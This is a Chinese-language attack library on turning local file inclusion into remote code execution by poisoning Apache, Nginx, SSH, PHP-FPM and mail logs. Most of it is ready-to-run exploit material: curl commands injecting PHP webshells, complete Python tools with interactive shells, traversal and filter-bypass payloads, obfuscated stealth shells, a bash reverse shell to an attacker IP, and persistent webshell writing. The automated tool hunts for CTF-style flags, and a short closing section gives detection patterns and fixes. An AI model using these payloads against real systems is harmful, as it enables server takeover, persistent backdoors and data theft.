# 文件包含-日志注入RCE 攻击库

## 漏洞概述

LFI(Local File Inclusion)日志注入RCE是一种将本地文件包含漏洞升级为远程代码执行的高级攻击技术。攻击者首先通过可控的HTTP头部(如User-Agent)将恶意PHP代码注入到Web服务器日志文件中,然后利用LFI漏洞包含该日志文件,使注入的PHP代码被执行。

**攻击价值**:
- 将LFI升级为RCE
- 绕过文件上传限制
- 执行任意系统命令
- 读取敏感文件
- 建立反向shell

**常见注入点**:
- Apache access.log / error.log
- Nginx access.log / error.log  
- PHP-FPM日志
- SSH日志 (/var/log/auth.log)
- Mail日志 (/var/log/mail)

## 核心攻击技术

### 1. Apache访问日志注入

**原理**: Apache将HTTP请求记录到access.log,包括User-Agent等头部

**日志格式**:
```
192.168.1.100 - - [17/Nov/2025:10:30:00 +0000] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0 ..."
                                                                                          ^^^^^^^^ User-Agent
```

**攻击步骤**:

**步骤1: 注入恶意代码到日志**

```bash
# 基础webshell注入
curl http://target.com/index.php \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

# 更隐蔽的注入
curl http://target.com/index.php \
  -H "User-Agent: <?=\`\$_GET[c]\`;?>"

# 完整功能的webshell
curl http://target.com/index.php \
  -H "User-Agent: <?php @eval(\$_POST['x']); ?>"
```

**步骤2: 通过LFI包含日志触发代码**

```bash
# 基础LFI
http://target.com/index.php?page=/var/log/apache2/access.log&cmd=id

# 路径遍历绕过
http://target.com/index.php?page=....//....//var/log/apache2/access.log&cmd=whoami

# 完整利用
http://target.com/index.php?page=../../../../../../var/log/apache2/access.log&cmd=cat%20/etc/passwd
```

**Python完整利用脚本**:

```python
#!/usr/bin/env python3
import requests
import base64
from urllib.parse import quote

class ApacheLogPoisoning:
    """Apache日志注入RCE工具"""
    
    def __init__(self, target_url, lfi_param='page'):
        self.target_url = target_url
        self.lfi_param = lfi_param
        self.log_paths = [
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',
            '/usr/local/apache/logs/access_log',
            '/var/www/logs/access.log',
        ]
    
    def inject_webshell(self):
        """步骤1: 注入PHP webshell到日志"""
        print("[*] 注入webshell到Apache日志...")
        
        # 使用简短的webshell减少日志污染
        webshell = "<?php system($_GET['cmd']); ?>"
        
        headers = {
            'User-Agent': webshell
        }
        
        try:
            response = requests.get(self.target_url, headers=headers, timeout=5)
            print(f"[+] Webshell已注入! 状态码: {response.status_code}")
            return True
        
        except Exception as e:
            print(f"[-] 注入失败: {e}")
            return False
    
    def find_log_path(self):
        """步骤2: 查找可访问的日志文件路径"""
        print("\n[*] 查找日志文件...")
        
        # 路径遍历payload列表
        traversal_patterns = [
            '../' * i for i in range(1, 10)
        ] + [
            '....//....//../..//../..//..//',
            '.././.././.././.././',
        ]
        
        for log_path in self.log_paths:
            for pattern in traversal_patterns:
                test_path = pattern + log_path
                url = f"{self.target_url}?{self.lfi_param}={test_path}"
                
                try:
                    response = requests.get(url, timeout=5)
                    
                    # 检查响应是否包含日志内容特征
                    if any(marker in response.text for marker in 
                           ['GET', 'POST', 'HTTP/1.', 'Mozilla', 'curl']):
                        print(f"[+] 找到日志文件: {test_path}")
                        return test_path
                
                except:
                    continue
        
        print("[-] 未找到可访问的日志文件")
        return None
    
    def execute_command(self, log_path, command):
        """步骤3: 通过LFI执行命令"""
        url = f"{self.target_url}?{self.lfi_param}={log_path}&cmd={quote(command)}"
        
        try:
            response = requests.get(url, timeout=10)
            
            # 提取命令输出(通常在日志内容中)
            # 需要过滤掉其他日志行
            output = self._extract_output(response.text)
            
            return output
        
        except Exception as e:
            print(f"[-] 执行失败: {e}")
            return None
    
    def _extract_output(self, response_text):
        """从响应中提取命令输出"""
        # 尝试找到命令输出(在最后一个日志条目之后)
        lines = response_text.split('\n')
        
        # 查找包含我们webshell的行
        for i, line in enumerate(lines):
            if '<?php system' in line or 'User-Agent' in line:
                # 输出可能在下一行或同一行
                if i + 1 < len(lines):
                    return lines[i + 1]
        
        return response_text
    
    def exploit(self):
        """完整利用流程"""
        print(f"\n{'='*60}")
        print("Apache日志注入RCE利用")
        print(f"{'='*60}\n")
        
        # 步骤1: 注入webshell
        if not self.inject_webshell():
            return False
        
        # 步骤2: 查找日志路径
        log_path = self.find_log_path()
        if not log_path:
            return False
        
        # 步骤3: 交互式命令执行
        print(f"\n[+] RCE已建立! 日志路径: {log_path}")
        print("[*] 输入命令 (输入'exit'退出):\n")
        
        while True:
            try:
                cmd = input("shell> ").strip()
                
                if cmd.lower() == 'exit':
                    break
                
                if not cmd:
                    continue
                
                output = self.execute_command(log_path, cmd)
                if output:
                    print(output)
            
            except KeyboardInterrupt:
                print("\n[*] 退出...")
                break
            
            except Exception as e:
                print(f"[-] 错误: {e}")
        
        return True

# 使用示例
if __name__ == "__main__":
    exploiter = ApacheLogPoisoning(
        target_url="http://target.com/vulnerable.php",
        lfi_param="page"
    )
    exploiter.exploit()
```

### 2. Nginx访问日志注入

**日志路径**:
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`

**攻击脚本**:

```python
def nginx_log_poisoning(target_url, lfi_param):
    """Nginx日志注入"""
    
    # 注入webshell
    webshell = "<?php eval($_POST['x']); ?>"
    headers = {'User-Agent': webshell}
    
    requests.get(target_url, headers=headers)
    
    # Nginx日志路径
    nginx_logs = [
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '../../../../../../var/log/nginx/access.log',
    ]
    
    for log_path in nginx_logs:
        url = f"{target_url}?{lfi_param}={log_path}"
        response = requests.post(url, data={'x': 'system("id");'})
        
        if 'uid=' in response.text:
            print(f"[+] 成功! 日志路径: {log_path}")
            return log_path
    
    return None
```

### 3. SSH日志注入 (auth.log)

**原理**: SSH登录尝试会记录到auth.log,用户名可控

**日志格式**:
```
Nov 17 10:30:00 server sshd[1234]: Failed password for EVIL_CODE from 192.168.1.100 port 22 ssh2
```

**攻击步骤**:

```bash
# 步骤1: 通过SSH注入PHP代码(使用用户名)
ssh '<?php system($_GET["c"]); ?>'@target.com

# 步骤2: LFI包含auth.log
http://target.com/index.php?page=/var/log/auth.log&c=whoami
```

**Python脚本**:

```python
import paramiko
import requests

def ssh_log_poisoning(target_host, target_url, lfi_param):
    """SSH日志注入RCE"""
    
    # 步骤1: SSH注入
    print("[*] 通过SSH注入webshell...")
    
    webshell_user = '<?php system($_GET["cmd"]); ?>'
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 故意使用错误密码,只为触发日志
        ssh.connect(
            target_host,
            username=webshell_user,
            password='wrong_password',
            timeout=5
        )
    except:
        pass  # 预期会失败
    
    print("[+] Webshell已注入到auth.log")
    
    # 步骤2: LFI包含auth.log
    auth_logs = [
        '/var/log/auth.log',
        '../../../../../../var/log/auth.log',
    ]
    
    for log_path in auth_logs:
        url = f"{target_url}?{lfi_param}={log_path}&cmd=id"
        response = requests.get(url)
        
        if 'uid=' in response.text:
            print(f"[+] RCE成功! 日志: {log_path}")
            return log_path
    
    return None
```

### 4. PHP-FPM日志注入

**日志路径**:
- `/var/log/php-fpm/error.log`
- `/var/log/php7.4-fpm.log`

**触发方法**:

```python
def php_fpm_log_poisoning(target_url):
    """PHP-FPM日志注入"""
    
    # 通过触发PHP错误将代码写入error.log
    payload = "<?php system($_GET['cmd']); ?>"
    
    # 方法1: 通过User-Agent
    headers = {'User-Agent': payload}
    requests.get(target_url, headers=headers)
    
    # 方法2: 通过Referer
    headers = {'Referer': payload}
    requests.get(target_url, headers=headers)
    
    # 包含error.log
    lfi_url = f"{target_url}?page=/var/log/php-fpm/error.log&cmd=whoami"
    response = requests.get(lfi_url)
    
    return response.text
```

### 5. Mail日志注入

**原理**: 邮件日志记录发件人和收件人地址

**攻击步骤**:

```bash
# 步骤1: 发送恶意邮件
telnet target.com 25
HELO attacker.com
MAIL FROM: <?php system($_GET['cmd']); ?>
RCPT TO: test@target.com
DATA
Subject: Test
.
QUIT

# 步骤2: LFI包含mail日志
http://target.com/index.php?page=/var/log/mail&cmd=id
```

## 高级利用技术

### 1. 路径遍历绕过过滤

**常见过滤**:
- 过滤 `../`
- 过滤 `/var/log/`
- 限制文件扩展名

**绕过技术**:

```python
def advanced_path_traversal():
    """高级路径遍历技巧"""
    
    bypass_payloads = {
        # 双重编码
        'double_encode': '%252e%252e%252f',  # ../
        
        # 16位Unicode
        'unicode': '%c0%ae%c0%ae%c0%af',
        
        # 混合遍历
        'mixed': '....//....//../..//../..//..//',
        
        # Null字节(老版本PHP)
        'null_byte': '../../../var/log/apache2/access.log%00',
        
        # 路径规范化绕过
        'normalize': '/var/www/html/../../log/apache2/access.log',
        
        # 使用符号链接
        'symlink': '/proc/self/root/var/log/apache2/access.log',
    }
    
    return bypass_payloads
```

### 2. 日志清理和隐蔽

**问题**: 注入的PHP代码会污染日志,容易被检测

**解决方案**:

```python
def stealthy_injection(target_url):
    """隐蔽的日志注入"""
    
    # 使用极短的webshell
    mini_shell = "<?=`$_GET[c]`?>"
    
    # 或使用base64编码
    import base64
    encoded = base64.b64encode(b"system($_GET['cmd']);").decode()
    b64_shell = f"<?php eval(base64_decode('{encoded}')); ?>"
    
    # 注入后立即使用,减少日志污染
    headers = {'User-Agent': mini_shell}
    requests.get(target_url, headers=headers)
    
    # 立即执行命令
    execute_cmd(target_url, 'whoami')
```

### 3. 反向Shell建立

**通过日志注入建立反向shell**:

```python
def establish_reverse_shell(target_url, lfi_param, log_path, attacker_ip, port):
    """通过日志注入建立反向shell"""
    
    # Bash反向shell payload
    reverse_shell = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
    
    # Base64编码避免特殊字符问题
    import base64
    encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
    
    # 执行反向shell
    cmd = f"echo {encoded_shell} | base64 -d | bash"
    
    url = f"{target_url}?{lfi_param}={log_path}&cmd={quote(cmd)}"
    
    print(f"[*] 建立反向shell到 {attacker_ip}:{port}")
    print(f"[*] 请先在攻击机上运行: nc -lvnp {port}")
    
    requests.get(url, timeout=2)
    
    print("[+] 反向shell已触发!")
```

### 4. 持久化Webshell

**写入永久webshell**:

```python
def write_persistent_shell(target_url, lfi_param, log_path):
    """通过日志注入写入持久化webshell"""
    
    # 写入webshell到Web目录
    webshell_content = "<?php @eval($_POST['x']); ?>"
    
    # 使用file_put_contents写入
    cmd = f"echo '{webshell_content}' > /var/www/html/shell.php"
    
    url = f"{target_url}?{lfi_param}={log_path}&cmd={quote(cmd)}"
    
    requests.get(url)
    
    # 验证webshell
    shell_url = target_url.replace('vulnerable.php', 'shell.php')
    response = requests.post(shell_url, data={'x': 'phpinfo();'})
    
    if 'phpinfo' in response.text.lower():
        print(f"[+] 持久化webshell已创建: {shell_url}")
        return shell_url
    
    return None
```

## 综合利用工具

```python
#!/usr/bin/env python3
import requests
import base64
from urllib.parse import quote

class LFI_LogRCE:
    """LFI日志注入RCE综合工具"""
    
    def __init__(self, target_url, lfi_param='page'):
        self.target_url = target_url
        self.lfi_param = lfi_param
        self.log_path = None
    
    def auto_exploit(self):
        """自动化完整利用流程"""
        
        print("[*] 开始自动化LFI日志注入攻击...\n")
        
        # 步骤1: 多种方式注入webshell
        print("[*] 步骤1: 注入webshell")
        self._inject_multiple_logs()
        
        # 步骤2: 查找可访问的日志
        print("\n[*] 步骤2: 查找日志文件")
        self.log_path = self._find_accessible_log()
        
        if not self.log_path:
            print("[-] 未找到可利用的日志文件")
            return False
        
        print(f"[+] 找到可利用日志: {self.log_path}\n")
        
        # 步骤3: 验证RCE
        print("[*] 步骤3: 验证RCE")
        if self._verify_rce():
            print("[+] RCE验证成功!\n")
            
            # 步骤4: 读取flag
            print("[*] 步骤4: 尝试读取flag")
            flag = self._read_flag()
            
            if flag:
                print(f"\n{'='*60}")
                print(f"[+] FLAG: {flag}")
                print(f"{'='*60}\n")
                return True
        
        return False
    
    def _inject_multiple_logs(self):
        """向多个日志源注入webshell"""
        
        webshell = "<?php system($_GET['cmd']); ?>"
        
        # 注入Apache/Nginx日志
        headers = {
            'User-Agent': webshell,
            'Referer': webshell,
            'X-Forwarded-For': webshell
        }
        
        try:
            requests.get(self.target_url, headers=headers, timeout=5)
            print("  [+] 已注入Web服务器日志")
        except:
            pass
    
    def _find_accessible_log(self):
        """查找可访问的日志文件"""
        
        log_candidates = [
            # Apache
            '/var/log/apache2/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',
            
            # Nginx
            '/var/log/nginx/access.log',
            
            # PHP
            '/var/log/php-fpm/error.log',
            
            # 其他
            '/var/log/auth.log',
            '/var/log/mail',
        ]
        
        traversal_prefixes = [
            '',
            '../' * 5,
            '../' * 10,
            '....//....//../..//../..//..//',
        ]
        
        for prefix in traversal_prefixes:
            for log in log_candidates:
                test_path = prefix + log
                url = f"{self.target_url}?{self.lfi_param}={test_path}"
                
                try:
                    response = requests.get(url, timeout=5)
                    
                    # 检测日志文件特征
                    if any(marker in response.text for marker in 
                           ['GET', 'POST', 'HTTP/', 'Mozilla']):
                        print(f"  [+] 找到: {test_path}")
                        return test_path
                except:
                    continue
        
        return None
    
    def _verify_rce(self):
        """验证RCE是否成功"""
        
        test_cmd = 'echo "RCE_TEST_SUCCESS"'
        url = f"{self.target_url}?{self.lfi_param}={self.log_path}&cmd={quote(test_cmd)}"
        
        try:
            response = requests.get(url, timeout=10)
            return 'RCE_TEST_SUCCESS' in response.text
        except:
            return False
    
    def _read_flag(self):
        """尝试读取flag"""
        
        flag_locations = [
            'cat /flag',
            'cat /flag.txt',
            'cat /FLAG',
            'cat /root/flag.txt',
            'cat /home/*/flag.txt',
            'find / -name flag.txt 2>/dev/null',
        ]
        
        for cmd in flag_locations:
            output = self.execute_command(cmd)
            
            if output and ('flag{' in output.lower() or 'xbow{' in output.lower()):
                import re
                flag_match = re.search(r'(flag|xbow)\{[^}]+\}', output, re.I)
                if flag_match:
                    return flag_match.group(0)
        
        return None
    
    def execute_command(self, command):
        """执行系统命令"""
        
        url = f"{self.target_url}?{self.lfi_param}={self.log_path}&cmd={quote(command)}"
        
        try:
            response = requests.get(url, timeout=10)
            return response.text
        except:
            return None
    
    def interactive_shell(self):
        """交互式shell"""
        
        print(f"\n[*] 交互式Shell (日志: {self.log_path})")
        print("[*] 输入 'exit' 退出\n")
        
        while True:
            try:
                cmd = input("shell> ").strip()
                
                if cmd.lower() == 'exit':
                    break
                
                if not cmd:
                    continue
                
                output = self.execute_command(cmd)
                if output:
                    print(output)
            
            except KeyboardInterrupt:
                print("\n[*] 退出...")
                break

# 使用示例
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("用法: python3 lfi_log_rce.py <target_url> [lfi_param]")
        print("示例: python3 lfi_log_rce.py http://target.com/index.php page")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'page'
    
    exploiter = LFI_LogRCE(target, param)
    
    if exploiter.auto_exploit():
        # 如果自动利用成功,提供交互式shell
        exploiter.interactive_shell()
```

## 防御检测

**检测方法**:

```python
# 检测日志注入尝试
def detect_log_injection():
    """检测日志注入攻击"""
    
    suspicious_patterns = [
        r'<\?php',
        r'<\?=',
        r'system\(',
        r'exec\(',
        r'eval\(',
        r'\$_GET',
        r'\$_POST',
        r'base64_decode',
    ]
    
    import re
    
    def check_header(header_value):
        for pattern in suspicious_patterns:
            if re.search(pattern, header_value, re.I):
                return True
        return False
    
    # 检查User-Agent, Referer等头部
    if check_header(request.headers.get('User-Agent', '')):
        log_security_alert("可能的日志注入攻击")
        return True
    
    return False
```

**防御措施**:

```php
// 禁用日志中的PHP执行
// 方法1: 在日志目录添加.htaccess
// <Files "*">
//   php_flag engine off
// </Files>

// 方法2: 过滤LFI路径
function safe_include($file) {
    // 白名单
    $allowed = ['page1.php', 'page2.php'];
    
    if (in_array($file, $allowed)) {
        include($file);
    } else {
        die('Access denied');
    }
}

// 方法3: 使用realpath验证
$file = $_GET['page'];
$real_path = realpath($file);
$base_path = realpath('/var/www/html/pages/');

if (strpos($real_path, $base_path) !== 0) {
    die('Invalid path');
}
```

## 关键成功要点

1. **日志注入成功**: PHP代码写入日志文件
2. **LFI可达日志**: 能够通过LFI包含日志文件
3. **代码执行**: 注入的PHP代码被解析执行
4. **命令执行**: 能够通过参数执行系统命令
5. **权限足够**: Web用户有读取日志的权限

## 成功标志

- 通过User-Agent成功注入PHP代码
- LFI能够包含并解析日志文件
- 执行`id`命令返回用户信息
- 能够读取敏感文件如/etc/passwd
- 成功建立交互式shell
- 读取flag文件内容
